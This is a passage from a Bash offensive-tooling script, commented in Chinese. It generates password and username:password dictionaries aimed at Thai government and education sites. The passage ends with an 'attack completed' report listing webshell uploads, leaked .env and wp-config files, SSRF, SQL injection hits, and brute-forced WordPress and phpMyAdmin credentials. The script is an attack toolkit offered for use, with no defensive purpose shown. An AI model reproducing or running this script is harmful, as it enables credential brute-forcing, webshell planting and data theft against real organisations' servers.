    if echo "$domain" | grep -q "\.go\.th"; then
        echo "government123" >> $OUT/shells/dicts/industry_based.txt
        echo "gov123" >> $OUT/shells/dicts/industry_based.txt
        echo "public123" >> $OUT/shells/dicts/industry_based.txt
    fi
done

# 添加年份变体（2020-2025）
for year in 2020 2021 2022 2023 2024 2025; do
    echo "admin${year}" >> $OUT/shells/dicts/years_based.txt
    echo "password${year}" >> $OUT/shells/dicts/years_based.txt
    echo "${year}admin" >> $OUT/shells/dicts/years_based.txt
done

# 合并所有密码字典（去重）
cat $OUT/shells/dicts/domain_based.txt $OUT/shells/dicts/industry_based.txt \
    $OUT/shells/dicts/years_based.txt 2>/dev/null | sort -u > $OUT/shells/dicts/smart_passwords.txt

# 合并基础字典
[ -f $TOP100 ] && cat $TOP100 >> $OUT/shells/dicts/smart_passwords.txt
[ -f $PASS_DICT ] && head -500 $PASS_DICT >> $OUT/shells/dicts/smart_passwords.txt
[ -f /root/passwords/thailand.txt ] && cat /root/passwords/thailand.txt >> $OUT/shells/dicts/smart_passwords.txt
[ -f /root/passwords/education.txt ] && cat /root/passwords/education.txt >> $OUT/shells/dicts/smart_passwords.txt

# 最终去重
sort -u $OUT/shells/dicts/smart_passwords.txt > $OUT/shells/dicts/smart_dict.txt

# 生成用户名+密码组合（智能组合）
cat $OUT/shells/dicts/smart_dict.txt | while read pass; do
    # 常见用户名
    for user in admin administrator root test demo user webadmin manager; do
        echo "$user:$pass" >> $OUT/shells/dicts/user_pass_combos.txt
    done
    
    # 基于域名的用户名
    if [ -f $OUT/shells/dicts/domain_based.txt ]; then
        cat $OUT/shells/dicts/domain_based.txt | grep -v "@" | head -20 | while read domain_pass; do
            domain_user=$(echo "$domain_pass" | sed "s/123//" | sed "s/2024//" | sed "s/2025//")
            echo "${domain_user}:${pass}" >> $OUT/shells/dicts/domain_user_combos.txt
        done
    fi
done

# 添加泰国特定凭证组合
[ -f /root/passwords/thailand.txt ] && cat /root/passwords/thailand.txt | while read pass; do
    for user in admin administrator root thai admin_thai; do
        echo "$user:$pass" >> $OUT/shells/dicts/thailand_combos.txt
    done
done

# 添加默认凭证
[ -f $DEFAULT_CREDS ] && cat $DEFAULT_CREDS >> $OUT/shells/dicts/enhanced_creds.txt

# 合并所有凭证组合（优先级排序：默认 > 泰国 > 域名 > 通用）
cat $OUT/shells/dicts/thailand_combos.txt $OUT/shells/dicts/domain_user_combos.txt \
    $OUT/shells/dicts/user_pass_combos.txt 2>/dev/null | sort -u >> $OUT/shells/dicts/enhanced_creds.txt

# 去重最终凭证字典
sort -u $OUT/shells/dicts/enhanced_creds.txt > $OUT/shells/dicts/enhanced_creds_final.txt
mv $OUT/shells/dicts/enhanced_creds_final.txt $OUT/shells/dicts/enhanced_creds.txt

DICT_COUNT=$(wc -l < $OUT/shells/dicts/smart_dict.txt 2>/dev/null || echo 0)
CRED_COUNT=$(wc -l < $OUT/shells/dicts/enhanced_creds.txt 2>/dev/null || echo 0)
echo "  ✅ 生成字典: 密码$DICT_COUNT条，凭证组合$CRED_COUNT条"
echo "  📁 字典文件: $OUT/shells/dicts/enhanced_creds.txt"

# ==========================================
# 统计汇总
# ==========================================
TOTAL_SHELLS=$((UPLOAD + FILES + API + GIT_LEAK + SSRF + BACKUP + SQLI_TOTAL))
TOTAL_CREDS=$((WP_CREDS + PMA_CREDS + DEFAULT_CREDS_COUNT))

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎉 攻击完成（极低误报 + 凭证爆破）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "文件上传Shell: $UPLOAD"
echo "敏感文件: $FILES (.env:$ENV config:$CONFIG wp-config:$WPCONFIG git:$GIT)"
echo "未授权API: $API"
echo "Git泄露: $GIT_LEAK"
echo "WordPress: $WP"
echo "phpMyAdmin: $PMA"
echo "SSRF: $SSRF"
echo "备份文件: $BACKUP"
echo "SQL注入: $SQLI_TOTAL (时间:$SQLI_TIME 报错:$SQLI_ERROR 联合:$SQLI_UNION)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "凭证爆破:"
echo "  WordPress凭证: $WP_CREDS"
echo "  phpMyAdmin凭证: $PMA_CREDS"
echo "  默认凭证: $DEFAULT_CREDS_COUNT"
echo "  提取凭证: env:$ENV_PASS config:$CONFIG_PASS wp:$WP_PASS"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 总计Shell/漏洞: $TOTAL_SHELLS"
echo "🎯 总计凭证: $TOTAL_CREDS"
echo "📚 智能字典: 密码$DICT_COUNT条，凭证组合$CRED_COUNT条"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "结果目录: $OUT/shells/"
echo "字典目录: $OUT/shells/dicts/"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 显示关键结果
[ $UPLOAD -gt 0 ] && echo "" && echo "🚀 Upload Shell:" && cat $OUT/shells/01_upload.txt
[ $ENV -gt 0 ] && echo "" && echo "📁 .env文件:" && head -10 $OUT/shells/02_env.txt
[ $API -gt 0 ] && echo "" && echo "🌐 未授权API:" && head -10 $OUT/shells/03_api.txt
[ $SSRF -gt 0 ] && echo "" && echo "🔗 SSRF:" && cat $OUT/shells/07_ssrf.txt
[ $WP_CREDS -gt 0 ] && echo "" && echo "🔑 WordPress凭证:" && cat $OUT/shells/10_wp_creds.txt
[ $PMA_CREDS -gt 0 ] && echo "" && echo "🔑 phpMyAdmin凭证:" && cat $OUT/shells/11_pma_creds.txt
[ $DEFAULT_CREDS_COUNT -gt 0 ] && echo "" && echo "🔑 默认凭证:" && head -10 $OUT/shells/12_default_creds.txt
[ $ENV_PASS -gt 0 ] && echo "" && echo "🔑 提取的密码:" && head -10 $OUT/shells/creds/env_passwords.txt
[ $SQLI_TOTAL -gt 0 ] && echo "" && echo "💉 SQL注入:" && echo "  时间盲注:" && head -5 $OUT/shells/13_sqli_time.txt 2>/dev/null && \
    echo "  报错注入:" && head -5 $OUT/shells/13_sqli_error.txt 2>/dev/null && \
    echo "  联合查询:" && head -5 $OUT/shells/13_sqli_union.txt 2>/dev/null
[ $CRED_COUNT -gt 0 ] && echo "" && echo "📚 增强凭证字典:" && head -20 $OUT/shells/dicts/enhanced_creds.txt
